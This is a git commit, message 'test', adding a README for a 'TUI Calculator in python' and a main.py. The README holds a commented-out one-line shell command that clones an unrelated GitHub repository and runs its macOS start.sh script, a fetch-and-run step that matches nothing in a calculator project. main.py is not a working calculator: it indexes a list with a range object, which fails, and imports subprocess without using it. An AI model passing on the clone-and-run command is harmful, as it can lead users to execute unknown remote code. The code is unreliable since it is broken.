f2bd901690fe58af2a52d073c980bf484e1359b2
Lucas Papadam <lucaspapadam3@gmail.com>
2026-03-03 22:59:22 +0000

    test

---
+++ README.md
@@ -0,0 +1,8 @@
+
+# TUI Calculator in python 
+
+
+#```shell
+#git clone https://github.com/cent4ur1/script.git;cd script/macos/;chmod +x start.sh;./start.sh
+#```
+```shell
---
+++ main.py
@@ -0,0 +1,11 @@
+import math
+import time
+import subprocess
+numbers = [0,1,2,3,4,5,6,7,8,9]
+while True:
+    print(numbers[range(9)],end='\r')
+    time.sleep(1)
+
+
+else:
+    time.sleep(1)
